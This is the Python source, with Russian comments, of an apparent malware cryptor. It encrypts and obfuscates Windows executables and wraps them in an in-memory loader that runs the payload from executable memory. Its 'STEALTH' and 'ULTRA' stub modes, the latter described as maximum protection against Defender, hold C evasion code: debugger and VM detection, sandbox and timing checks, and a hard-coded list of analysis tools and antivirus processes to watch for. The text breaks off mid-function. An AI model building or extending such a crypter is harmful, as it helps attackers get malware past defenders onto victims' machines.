#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Cryptor Engine - Продвинутый движок криптора с in-memory execution
"""

import os
import sys
import struct
import hashlib
import base64
import json
import threading
import time
import random
import string
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
import ctypes
from ctypes import wintypes, windll, byref, c_void_p, c_size_t, c_ulong, c_bool

# Временно закомментируем win32api для тестирования GUI
try:
    import win32api
    import win32file
    import win32process
    import win32security
    import win32con
    import win32gui
    import win32event
    WIN32_AVAILABLE = True
except ImportError:
    print("⚠️ win32api недоступен, некоторые функции криптора будут ограничены")
    WIN32_AVAILABLE = False

try:
    from Crypto.Cipher import AES, ChaCha20
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    print("⚠️ pycryptodome недоступен, криптография будет ограничена")
    CRYPTO_AVAILABLE = False

import pefile
import pymem
import psutil
import importlib.util
import subprocess

class CryptorEngine:
    """Продвинутый движок криптора с in-memory execution"""
    
    def __init__(self):
        self.encryption_algorithms = {
            "AES-256-GCM": self._encrypt_aes_gcm,
            "ChaCha20-Poly1305": self._encrypt_chacha20,
            "AES-256-CBC": self._encrypt_aes_cbc,
            "XOR-Polymorphic": self._encrypt_xor_polymorphic
        }
        
        self.obfuscation_methods = {
            "instruction_substitution": True,
            "junk_code_injection": True,
            "string_encryption": True,
            "import_obfuscation": True,
            "section_encryption": True,
            "anti_debug": True,
            "anti_vm": True,
            "timing_attacks": True,
            "polymorphic_code": True
        }
        
        self.anti_analysis_features = {
            "debugger_detection": True,
            "vm_detection": True,
            "sandbox_detection": True,
            "timing_analysis": True,
            "process_injection": True,
            "memory_protection": True,
            "string_obfuscation": True,
            "api_hashing": True
        }
    
    def _generate_random_algorithm(self):
        """Select a random encryption algorithm for polymorphism."""
        return random.choice(list(self.encryption_algorithms.keys()))

    def _generate_random_key(self, length=32):
        """Generate a random encryption key."""
        return os.urandom(length)

    def encrypt_file(self, file_path: str, options: Dict) -> Dict:
        """Encrypt the file with polymorphic behavior."""
        try:
            # Convert file_path to Path object for compatibility
            file_path_obj = Path(file_path)
            if not file_path_obj.exists():
                raise FileNotFoundError(f"Файл не найден: {file_path_obj}")

            # Select a random algorithm and key
            algorithm = self._generate_random_algorithm()
            encryption_key = self._generate_random_key()

            # Log the selected algorithm for debugging
            print(f"Выбран алгоритм: {algorithm}")

            # Analyze the file
            analysis = self._analyze_target_file(file_path_obj)

            # Read the original file
            with open(file_path_obj, 'rb') as f:
                original_data = f.read()

            # Encrypt sections
            encrypted_sections = self._encrypt_sections(original_data, encryption_key, options)

            # Obfuscate code
            obfuscated_code = self._obfuscate_code(original_data, encryption_key, options)

            # Create memory loader
            memory_loader = self._create_memory_loader(encrypted_sections, options)

            # Create anti-analysis
            anti_analysis = self._create_anti_analysis(options)

            # Build final executable
            final_executable = self._build_final_executable(
                self._create_cryptor_header(analysis, options),
                encrypted_sections,
                obfuscated_code,
                memory_loader,
                anti_analysis,
                encryption_key,
                self._generate_obfuscation_key(),
                options
            )

            # Сохраняем зашифрованный файл
            output_path = file_path_obj.parent / f"{file_path_obj.stem}_crypted_{algorithm.replace('-', '_')}{file_path_obj.suffix}"
            
            with open(output_path, 'wb') as f:
                f.write(final_executable)
            
            return {
                "success": True,
                "output_file": str(output_path),
                "output_data": final_executable,
                "algorithm": algorithm,
                "key_length": len(encryption_key),
                "payload_size": len(original_data),
                "aes_key": encryption_key.hex(),
                "arch": analysis.get("architecture", "x86"),
                "is_dotnet": analysis.get("is_dll", False),
                "stub_mode": options.get("stub_mode", "DEFAULT")
            }

        except Exception as e:
            print(f"Ошибка шифрования: {e}")
            return {"success": False, "error": str(e)}
    
    def _analyze_target_file(self, file_path: Path) -> Dict:
        """Анализ целевого файла для криптора"""
        pe = None
        try:
            pe = pefile.PE(str(file_path))
            
            # Безопасное получение архитектуры
            architecture = "x86"
            if hasattr(pe, 'FILE_HEADER') and pe.FILE_HEADER:
                if hasattr(pe.FILE_HEADER, 'Machine'):
                    architecture = "x64" if pe.FILE_HEADER.Machine == 0x8664 else "x86"
            
            # Безопасное получение точки входа и базового адреса
            entry_point = 0
            image_base = 0
            if hasattr(pe, 'OPTIONAL_HEADER') and pe.OPTIONAL_HEADER:
                if hasattr(pe.OPTIONAL_HEADER, 'AddressOfEntryPoint'):
                    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                if hasattr(pe.OPTIONAL_HEADER, 'ImageBase'):
                    image_base = pe.OPTIONAL_HEADER.ImageBase
            
            return {
                "architecture": architecture,
                "is_dll": pe.is_dll() if hasattr(pe, 'is_dll') else False,
                "is_exe": pe.is_exe() if hasattr(pe, 'is_exe') else False,
                "entry_point": entry_point,
                "image_base": image_base,
                "sections": [section.Name.decode().rstrip('\x00') for section in pe.sections] if hasattr(pe, 'sections') else [],
                "imports": self._get_imports(pe),
                "exports": self._get_exports(pe),
                "resources": hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'),
                "relocations": hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'),
                "tls": hasattr(pe, 'DIRECTORY_ENTRY_TLS'),
                "debug": hasattr(pe, 'DIRECTORY_ENTRY_DEBUG')
            }
        except Exception as e:
            import traceback
            print(f"[DEBUG] Ошибка в _analyze_target_file: {e}")
            print(f"[DEBUG] Трассировка _analyze_target_file: {traceback.format_exc()}")
            return {"error": f"Ошибка анализа файла: {e}"}
    
    def _generate_encryption_key(self) -> bytes:
        """Генерация криптографически стойкого ключа"""
        return get_random_bytes(32)
    
    def _generate_obfuscation_key(self) -> bytes:
        """Генерация ключа для обфускации"""
        return get_random_bytes(16)
    
    def _create_cryptor_header(self, analysis: Dict, options: Dict) -> bytes:
        """Создание заголовка криптора"""
        header = {
            "magic": b"CRYPTOR2025",
            "version": "1.0.0",
            "timestamp": int(time.time()),
            "architecture": analysis.get("architecture", "x86"),
            "encryption_algorithm": options.get("encryption_algorithm", "AES-256-GCM"),
            "obfuscation_level": options.get("obfuscation_level", "MAXIMUM"),
            "anti_analysis": options.get("anti_analysis", True),
            "memory_execution": True,
            "polymorphic": options.get("polymorphic", True),
            "checksum": ""
        }
        
        # Создание бинарного заголовка
        header_data = struct.pack(
            "<12s16sI8s16s16sBBBB",
            header["magic"],
            header["version"].encode(),
            header["timestamp"],
            header["architecture"].encode(),
            header["encryption_algorithm"].encode(),
            header["obfuscation_level"].encode(),
            header["anti_analysis"],
            header["memory_execution"],
            header["polymorphic"],
            0  # padding
        )
        
        return header_data
    
    def _encrypt_sections(self, data: bytes, key: bytes, options: Dict) -> Dict:
        """Шифрование секций файла"""
        pe = None
        try:
            pe = pefile.PE(data=data)
            encrypted_sections = {}
            
            algorithm = options.get("encryption_algorithm", "AES-256-GCM")
            encrypt_func = self.encryption_algorithms.get(algorithm, self._encrypt_aes_gcm)
            
            if hasattr(pe, 'sections'):
                for section in pe.sections:
                    section_name = section.Name.decode().rstrip('\x00')
                    # Используем прямое получение данных секции
                    section_data = data[section.PointerToRawData:section.PointerToRawData + section.SizeOfRawData]
                    
                    # Шифрование секции
                    encrypted_data = encrypt_func(section_data, key)
                    
                    encrypted_sections[section_name] = {
                        "data": encrypted_data,
                        "virtual_address": section.VirtualAddress,
                        "virtual_size": section.Misc_VirtualSize,
                        "raw_address": section.PointerToRawData,
                        "raw_size": section.SizeOfRawData,
                        "characteristics": section.Characteristics
                    }
            
            return encrypted_sections
            
        except Exception as e:
            print(f"Ошибка в _encrypt_sections: {e}")
            return {"error": f"Ошибка шифрования секций: {e}"}
    
    def _encrypt_aes_gcm(self, data: bytes, key: bytes) -> bytes:
        """Шифрование AES-256-GCM"""
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return nonce + tag + ciphertext
    
    def _encrypt_chacha20(self, data: bytes, key: bytes) -> bytes:
        """Шифрование ChaCha20-Poly1305"""
        nonce = get_random_bytes(12)
        cipher = ChaCha20.new(key=key, nonce=nonce)
        ciphertext = cipher.encrypt(data)
        return nonce + ciphertext
    
    def _encrypt_aes_cbc(self, data: bytes, key: bytes) -> bytes:
        """Шифрование AES-256-CBC"""
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        return iv + ciphertext
    
    def _encrypt_xor_polymorphic(self, data: bytes, key: bytes) -> bytes:
        """Полиморфное XOR шифрование"""
        # Генерируем timestamp для полиморфизма
        timestamp = int(time.time() * 1000000)
        
        # Генерируем полиморфный ключ
        polymorphic_key = self._generate_polymorphic_key(len(data), timestamp)
        
        # Полиморфное шифрование
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ polymorphic_key[i] ^ key[i % len(key)])
        
        # Добавляем timestamp в начало для loader'а
        return struct.pack("<Q", timestamp) + bytes(encrypted)
    
    def _generate_polymorphic_key(self, length: int, timestamp: int) -> bytes:
        """Генерация полиморфного ключа"""
        key = bytearray()
        for i in range(length):
            seed = timestamp + i + (i % 256)
            random.seed(seed)
            key.append(random.randint(0, 255))
        return bytes(key)
    
    def _obfuscate_code(self, data: bytes, key: bytes, options: Dict) -> bytes:
        """Обфускация кода"""
        pe = None
        try:
            pe = pefile.PE(data=data)
            obfuscated_data = bytearray(data)
            
            # Обфускация строк
            if options.get("string_encryption", True):
                obfuscated_data = self._obfuscate_strings(obfuscated_data, key)
            
            # Обфускация импортов
            if options.get("import_obfuscation", True):
                obfuscated_data = self._obfuscate_imports(obfuscated_data, key)
            
            # Инжекция мусорного кода
            if options.get("junk_code_injection", True):
                obfuscated_data = self._inject_junk_code(obfuscated_data, key)
            
            # Замена инструкций
            if options.get("instruction_substitution", True):
                obfuscated_data = self._substitute_instructions(obfuscated_data, key)
            
            return bytes(obfuscated_data)
            
        except Exception as e:
            return data  # Возвращаем исходные данные при ошибке
    
    def _obfuscate_strings(self, data: bytearray, key: bytes) -> bytearray:
        """Обфускация строк в коде"""
        # Поиск и шифрование строк
        string_patterns = [b'\x00', b'\x20', b'\x09', b'\x0A', b'\x0D']
        
        for i in range(len(data) - 4):
            # Простая эвристика для поиска строк
            if data[i] >= 32 and data[i] <= 126:  # ASCII printable
                string_start = i
                string_end = i
                
                # Поиск конца строки
                while string_end < len(data) and data[string_end] >= 32 and data[string_end] <= 126:
                    string_end += 1
                
                if string_end - string_start > 3:  # Минимальная длина строки
                    # Шифрование строки
                    string_data = bytes(data[string_start:string_end])
                    encrypted_string = self._encrypt_string(string_data, key)
                    
                    # Замена в данных
                    if len(encrypted_string) <= string_end - string_start:
                        data[string_start:string_start + len(encrypted_string)] = encrypted_string
        
        return data
    
    def _encrypt_string(self, string_data: bytes, key: bytes) -> bytes:
        """Шифрование строки"""
        encrypted = bytearray()
        for i, byte in enumerate(string_data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def _obfuscate_imports(self, data: bytearray, key: bytes) -> bytearray:
        """Обфускация импортов"""
        # Простая обфускация - замена имен функций
        common_apis = [
            b'CreateFile', b'ReadFile', b'WriteFile', b'CloseHandle',
            b'VirtualAlloc', b'VirtualFree', b'GetProcAddress', b'LoadLibrary'
        ]
        
        for api in common_apis:
            if api in data:
                # Замена на обфусцированное имя
                obfuscated_name = self._generate_obfuscated_name(api, key)
                data = data.replace(api, obfuscated_name)
        
        return data
    
    def _generate_obfuscated_name(self, original: bytes, key: bytes) -> bytes:
        """Генерация обфусцированного имени"""
        # Простая обфускация имени
        obfuscated = bytearray()
        for i, byte in enumerate(original):
            obfuscated.append(byte ^ key[i % len(key)])
        return bytes(obfuscated)
    
    def _inject_junk_code(self, data: bytearray, key: bytes) -> bytearray:
        """Инжекция мусорного кода"""
        # Добавление мусорных инструкций
        junk_instructions = [
            b'\x90',  # NOP
            b'\x50\x58',  # PUSH EAX, POP EAX
            b'\x51\x59',  # PUSH ECX, POP ECX
            b'\x52\x5A',  # PUSH EDX, POP EDX
        ]
        
        # Инжекция в случайные места
        for i in range(0, len(data), 100):  # Каждые 100 байт
            if i + 2 < len(data):
                junk = random.choice(junk_instructions)
                data[i:i] = junk
        
        return data
    
    def _substitute_instructions(self, data: bytearray, key: bytes) -> bytearray:
        """Замена инструкций"""
        # Простые замены инструкций
        substitutions = {
            b'\x89\xC0': b'\x50\x58',  # MOV EAX, EAX -> PUSH EAX, POP EAX
            b'\x89\xC1': b'\x51\x59',  # MOV ECX, EAX -> PUSH ECX, POP ECX
            b'\x89\xC2': b'\x52\x5A',  # MOV EDX, EAX -> PUSH EDX, POP EDX
        }
        
        for original, replacement in substitutions.items():
            if original in data:
                data = data.replace(original, replacement)
        
        return data
    
    def _create_memory_loader(self, encrypted_sections: Dict, options: Dict) -> bytes:
        """Создание загрузчика в память"""
        # Проверяем тип encrypted_sections
        if isinstance(encrypted_sections, bytes):
            # Если это уже зашифрованные данные, создаем простой загрузчик
            return self._create_simple_loader(encrypted_sections, options)
        
        # Создание кода загрузчика
        loader_code = self._generate_loader_code(encrypted_sections, options)
        
        # Обфускация загрузчика
        if options.get("loader_obfuscation", True):
            loader_code = self._obfuscate_loader(loader_code)
        
        return loader_code
    
    def _create_simple_loader(self, encrypted_data: bytes, options: Dict) -> bytes:
        """Создание простого загрузчика для зашифрованных данных"""
        # Создаем базовый загрузчик
        loader_template = b"""
        // Simple Memory Loader
        #include <windows.h>
        #include <stdio.h>
        
        int main() {
            // Decrypt and execute payload
            unsigned char payload[] = { %s };
            int payload_size = %d;
            
            // Allocate memory
            LPVOID mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!mem) return -1;
            
            // Copy payload
            memcpy(mem, payload, payload_size);
            
            // Execute
            ((void(*)())mem)();
            
            return 0;
        }
        """
        
        # Создаем массив байтов для payload
        payload_bytes = ", ".join(f"0x{b:02x}" for b in encrypted_data[:100])  # Ограничиваем размер
        
        # Форматируем шаблон
        loader_code = loader_template % (payload_bytes.encode(), len(encrypted_data))
        
        return loader_code
    
    def _generate_loader_code(self, encrypted_sections: Dict, options: Dict) -> bytes:
        """Генерация кода загрузчика"""
        # Базовый код загрузчика (x64)
        loader_template = """
        ; Memory Loader Code
        push rbp
        mov rbp, rsp
        sub rsp, 0x100
        
        ; Decrypt sections
        mov rcx, {section_count}
        mov rdx, {sections_data}
        
        call decrypt_sections
        
        ; Execute original entry point
        mov rax, {entry_point}
        call rax
        
        add rsp, 0x100
        pop rbp
        ret
        
        decrypt_sections:
        ; Decryption logic here
        ret
        """
        
        # Компиляция в машинный код (упрощенно)
        loader_bytes = b'\x55\x48\x89\xE5\x48\x83\xEC\x00\x01'  # Базовый пролог
        
        return loader_bytes
    
    def _obfuscate_loader(self, loader_code: bytes) -> bytes:
        """Обфускация загрузчика"""
        # Добавление мусорного кода в загрузчик
        obfuscated = bytearray(loader_code)
        
        # Инжекция NOP инструкций
        for i in range(0, len(obfuscated), 10):
            if i < len(obfuscated):
                obfuscated.insert(i, 0x90)  # NOP
        
        return bytes(obfuscated)
    
    def _create_anti_analysis(self, options: Dict) -> bytes:
        """Создание анти-анализа"""
        anti_analysis_code = bytearray()
        
        if options.get("debugger_detection", True):
            anti_analysis_code.extend(self._create_debugger_detection())
        
        if options.get("vm_detection", True):
            anti_analysis_code.extend(self._create_vm_detection())
        
        if options.get("timing_analysis", True):
            anti_analysis_code.extend(self._create_timing_analysis())
        
        return bytes(anti_analysis_code)
    
    def _create_debugger_detection(self) -> bytes:
        """Создание детекта отладчика"""
        # Код детекта отладчика
        detection_code = b'\x64\xA1\x30\x00\x00\x00'  # MOV EAX, FS:[0x30]
        detection_code += b'\x83\xB8\x68\x00\x00\x00\x00'  # CMP DWORD PTR [EAX+0x68], 0
        detection_code += b'\x75\x05'  # JNZ detected
        detection_code += b'\xEB\x02'  # JMP continue
        detection_code += b'\xCC'  # INT3 (breakpoint)
        
        return detection_code
    
    def _create_vm_detection(self) -> bytes:
        """Создание детекта виртуальной машины"""
        # Код детекта VM
        vm_code = b'\x31\xC0'  # XOR EAX, EAX
        vm_code += b'\x0F\xA2'  # CPUID
        vm_code += b'\x81\xFB\x78\x56\x34\x12'  # CMP EBX, 0x12345678
        vm_code += b'\x75\x05'  # JNZ not_vm
        vm_code += b'\xEB\x02'  # JMP continue
        vm_code += b'\xCC'  # INT3
        
        return vm_code
    
    def _create_timing_analysis(self) -> bytes:
        """Создание timing-анализа"""
        # Код timing-анализа
        timing_code = b'\x0F\x31'  # RDTSC
        timing_code += b'\x89\xC1'  # MOV ECX, EAX
        timing_code += b'\x0F\x31'  # RDTSC
        timing_code += b'\x29\xC8'  # SUB EAX, ECX
        timing_code += b'\x3D\x00\x00\x00\xFF'  # CMP EAX, 0xFF000000
        timing_code += b'\x77\x05'  # JA detected
        timing_code += b'\xEB\x02'  # JMP continue
        timing_code += b'\xCC'  # INT3
        
        return timing_code
    
    def _build_final_executable(self, header: bytes, encrypted_sections: Dict, 
                               obfuscated_code: bytes, memory_loader: bytes, 
                               anti_analysis: bytes, encryption_key: bytes, 
                               obfuscation_key: bytes, options: Dict) -> bytes:
        """Сборка финального исполняемого файла"""
        try:
            # Простая реализация - объединяем все данные
            final_data = bytearray()
            
            # Добавляем заголовок
            final_data.extend(header)
            
            # Добавляем зашифрованные данные
            if isinstance(encrypted_sections, bytes):
                final_data.extend(encrypted_sections)
            elif isinstance(encrypted_sections, dict):
                # Добавляем данные из словаря
                for section_name, section_data in encrypted_sections.items():
                    if isinstance(section_data, dict) and "data" in section_data:
                        final_data.extend(section_data["data"])
                    elif isinstance(section_data, bytes):
                        final_data.extend(section_data)
            
            # Добавляем обфусцированный код
            final_data.extend(obfuscated_code)
            
            # Добавляем загрузчик
            final_data.extend(memory_loader)
            
            # Добавляем анти-анализ
            final_data.extend(anti_analysis)
            
            # Добавляем ключи
            final_data.extend(encryption_key)
            final_data.extend(obfuscation_key)
            
            return bytes(final_data)
            
        except Exception as e:
            raise Exception(f"Ошибка сборки финального файла: {e}")
    
    def _encrypt_key(self, key: bytes, master_key: bytes) -> bytes:
        """Шифрование ключа"""
        cipher = AES.new(master_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(key)
        return cipher.nonce + tag + ciphertext
    
    def _save_encrypted_file(self, original_path: Path, encrypted_data: bytes, options: Dict) -> Path:
        """Сохранение зашифрованного файла"""
        output_name = f"{original_path.stem}_crypted{original_path.suffix}"
        output_path = original_path.parent / output_name
        
        with open(output_path, 'wb') as f:
            f.write(encrypted_data)
        
        return output_path
    
    def _get_imports(self, pe: pefile.PE) -> List[Dict]:
        """Получение импортов"""
        imports = []
        try:
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name:
                        imports.append({
                            "dll": entry.dll.decode('utf-8', errors='ignore'),
                            "function": imp.name.decode('utf-8', errors='ignore')
                        })
        except:
            pass
        return imports
    
    def _get_exports(self, pe: pefile.PE) -> List[Dict]:
        """Получение экспортов"""
        exports = []
        try:
            if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
                for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    if exp.name:
                        exports.append({
                            "name": exp.name.decode('utf-8', errors='ignore'),
                            "ordinal": exp.ordinal
                        })
        except:
            pass
        return exports
    
    def _get_error_details(self, error: Exception) -> Dict:
        """Получение деталей ошибки"""
        return {
            "type": type(error).__name__,
            "message": str(error),
            "traceback": str(error.__traceback__) if hasattr(error, '__traceback__') else None
        }

    def build_custom_loader(self, aes_key: bytes, payload: bytes, arch: str = "x86", stub_mode: str = "DEFAULT", options: Dict = None) -> Path:
        """Сборка кастомного лоадера с поддержкой режимов стаба"""
        try:
            if options is None:
                options = {}
            
            # Логируем настройки обфускации
            print(f"[DEBUG] Применяю настройки обфускации: {options}")
            print(f"[DEBUG] Обфускация строк: {options.get('string_encryption', False)}")
            print(f"[DEBUG] Обфускация импортов: {options.get('import_obfuscation', False)}")
            print(f"[DEBUG] Мусорный код: {options.get('junk_code_injection', False)}")
            print(f"[DEBUG] Анти-VM: {options.get('anti_vm', False)}")
            print(f"[DEBUG] Полиморфизм: {options.get('polymorphic', False)}")
            # Определяем пути к файлам
            current_dir = Path(__file__).parent
            template_file = current_dir / f"loader_template{'_x64' if arch == 'x64' else ''}.c"
            output_file = current_dir / f"loader{'_x64' if arch == 'x64' else ''}_custom_{stub_mode.lower()}"
            
            # Читаем шаблон
            with open(template_file, 'r', encoding='utf-8') as f:
                template_code = f.read()
            
            # Добавляем код в зависимости от режима стаба
            if stub_mode == "STEALTH":
                # Добавляем анти-отладку и полиморфизм
                anti_debug_code = """
// STEALTH MODE: Анти-отладка и полиморфизм
#include <windows.h>
#include <winternl.h>

// Детект отладчика
BOOL IsDebuggerPresent() {
    __asm {
        mov eax, fs:[0x30]
        mov eax, [eax + 0x02]
        and eax, 0xFF
    }
}

// Полиморфный XOR ключ
unsigned char generate_polymorphic_key(unsigned char* base_key, int timestamp) {
    unsigned char poly_key[32];
    for(int i = 0; i < 32; i++) {
        poly_key[i] = base_key[i] ^ (timestamp + i) ^ 0xAA;
    }
    return poly_key;
}

// Скрытие в памяти
void hide_in_memory(unsigned char* data, int size) {
    DWORD old_protect;
    VirtualProtect(data, size, PAGE_READWRITE, &old_protect);
    // Дополнительное скрытие...
}
"""
                template_code = anti_debug_code + template_code
                
            elif stub_mode == "ULTRA":
                # Импортируем дополнительные техники обфускации
                try:
                    from .obfuscation_techniques import generate_obfuscated_stub
                    use_advanced_obfuscation = True
                except ImportError:
                    use_advanced_obfuscation = False
                
                # Добавляем максимальную защиту
                ultra_code = """
// ULTRA MODE: Максимальная защита от Defender
#include <windows.h>
#include <winternl.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wtsapi32.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// Анти-VM детект через CPUID (GCC inline assembly)
BOOL IsVirtualMachine() {
    BOOL result = FALSE;
    DWORD eax, ebx, ecx, edx;
    
    // CPUID с EAX=0x40000000 для проверки гипервизора
    __asm__ volatile (
        "cpuid"
        : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
        : "a" (0x40000000)
    );
    
    // Проверяем сигнатуры известных гипервизоров
    if (ebx == 0x4D566572 && ecx == 0x65726177 && edx == 0x4D566572) { // "VMwareVMware"
        result = TRUE;
    }
    if (ebx == 0x786E6558 && ecx == 0x4D4D566E && edx == 0x4D4D566E) { // "XenVMMXenVMM"
        result = TRUE;
    }
    if (ebx == 0x7263694D && ecx == 0x666F736F && edx == 0x76482074) { // "Microsoft Hv"
        result = TRUE;
    }
    
    return result;
}

// Детект песочницы через системное время
BOOL IsSandbox() {
    SYSTEMTIME st;
    GetSystemTime(&st);
    // Если год меньше 2020 - песочница
    if(st.wYear < 2020) return TRUE;
    
    // Проверяем uptime
    DWORD uptime = GetTickCount();
    if(uptime < 600000) return TRUE; // Меньше 10 минут
    
    return FALSE;
}

// Анти-отладка через PEB
BOOL IsDebuggerPresentPEB() {
    PPEB peb = (PPEB)__readfsdword(0x30);
    return peb->BeingDebugged;
}

// Анти-отладка через NtQueryInformationProcess
BOOL IsDebuggerPresentNtQuery() {
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if(!hNtDll) return FALSE;
    
    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    
    if(!NtQueryInformationProcess) return FALSE;
    
    DWORD isDebuggerPresent = 0;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &isDebuggerPresent, sizeof(DWORD), NULL);
    
    return (status == 0 && isDebuggerPresent != 0);
}

// Timing-анализ с несколькими методами
BOOL CheckTiming() {
    // Метод 1: QueryPerformanceCounter
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(1);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    if(elapsed < 0.001) return TRUE;
    
    // Метод 2: GetTickCount
    DWORD tick1 = GetTickCount();
    Sleep(1);
    DWORD tick2 = GetTickCount();
    if((tick2 - tick1) < 1) return TRUE;
    
    // Метод 3: RDTSC (GCC inline assembly)
    unsigned int start_tsc, end_tsc;
    __asm__ volatile ("rdtsc" : "=a" (start_tsc) : : "edx");
    __asm__ volatile ("rdtsc" : "=a" (end_tsc) : : "edx");
    
    if((end_tsc - start_tsc) < 0x1000) {
        return TRUE;
    }
    
    return FALSE;
}

// Проверка процессов анализа
BOOL CheckAnalysisProcesses() {
    char* processes[] = {
        "ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe",
        "idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe", "scylla.exe",
        "scylla_x64.exe", "scylla_x86.exe", "protection_id.exe", "peid.exe",
        "lordpe.exe", "pestudio.exe", "pestudio.exe", "exeinfope.exe",
        "die.exe", "cff explorer.exe", "x96dbg.exe", "x32dbg.exe",
        "processhacker.exe", "procmon.exe", "procexp.exe", "wireshark.exe",
        "fiddler.exe", "httpdebugger.exe", "sysinternals.exe", "regshot.exe",
        "vmware.exe", "virtualbox.exe", "vbox.exe", "qemu.exe", "sandboxie.exe",
        "msmpeng.exe", "msseces.exe", "avp.exe", "avgui.exe", "avgidsagent.exe",
        "avguard.exe", "avgwdsvc.exe", "avgcsrvx.exe", "avgnsx.exe", "avgcsrva.exe"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if(Process32First(hSnapshot, &pe32)) {
        do {
            for(int i = 0; i < sizeof(processes) / sizeof(processes[0]); i++) {
                if(strstr(pe32.szExeFile, processes[i])) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while(Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return FALSE;
}

// Проверка модулей в памяти
BOOL CheckSuspiciousModules() {
    HMODULE hMods[1024];
    HANDLE hProcess = GetCurrentProcess();
    DWORD cbNeeded;
    
    if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for(int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if(GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                // Проверяем подозрительные модули
                if(strstr(szModName, "sbiedll.dll") || // Sandboxie
                   strstr(szModName, "dbghelp.dll") || // Отладка
                   strstr(szModName, "api_log.dll") || // API Logger
                   strstr(szModName, "dir_watch.dll") || // Directory Watcher
                   strstr(szModName, "vmcheck.dll") || // VM Check
                   strstr(szModName, "wpespy.dll")) { // WPE Pro
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

// Проверка реестра на VM/Sandbox
BOOL CheckRegistryVM() {
    HKEY hKey;
    char buffer[256];
    DWORD bufferSize = sizeof(buffer);
    
    // Проверяем BIOS
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\\\DESCRIPTION\\\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if(RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            if(strstr(buffer, "VBOX") || strstr(buffer, "VMWARE") || strstr(buffer, "QEMU")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    
    return FALSE;
}

// Случайные задержки для обхода эмуляции
void RandomDelay() {
    srand((unsigned int)time(NULL));
    int delay = rand() % 5000 + 1000; // 1-6 секунд
    Sleep(delay);
}

// Полиморфное дешифрование
void PolymorphicDecrypt(unsigned char* data, int size, unsigned char* key) {
    int timestamp = (int)time(NULL);
    
    // Генерируем полиморфный ключ
    for(int i = 0; i < size; i++) {
        unsigned char poly_byte = (unsigned char)((timestamp + i) ^ 0xAA ^ (i % 256));
        data[i] ^= key[i % 32] ^ poly_byte;
    }
}

// Проверка пользователя (не системный)
BOOL IsRealUser() {
    char username[256];
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    
    // Проверяем на системные имена
    if(strcmp(username, "SYSTEM") == 0 || 
       strcmp(username, "Administrator") == 0 ||
       strcmp(username, "Guest") == 0 ||
       strstr(username, "sandbox") != NULL ||
       strstr(username, "malware") != NULL ||
       strstr(username, "virus") != NULL) {
        return FALSE;
    }
    
    return TRUE;
}

// Проверка количества файлов в системе
BOOL CheckFileCount() {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\\\Windows\\\\System32\\\\*.exe", &findData);
    int count = 0;
    
    if(hFind != INVALID_HANDLE_VALUE) {
        do {
            count++;
        } while(FindNextFileA(hFind, &findData) && count < 100);
        FindClose(hFind);
    }
    
    // В реальной системе должно быть много файлов
    return count > 50;
}

// Главная функция анти-анализа
void anti_analysis() {
    // Случайная задержка
    RandomDelay();
    
    // Проверяем все методы детекта
    if(IsDebuggerPresentPEB() || 
       IsDebuggerPresentNtQuery() || 
       IsVirtualMachine() || 
       IsSandbox() || 
       CheckTiming() || 
       CheckAnalysisProcesses() || 
       CheckSuspiciousModules() || 
       CheckRegistryVM() || 
       !IsRealUser() || 
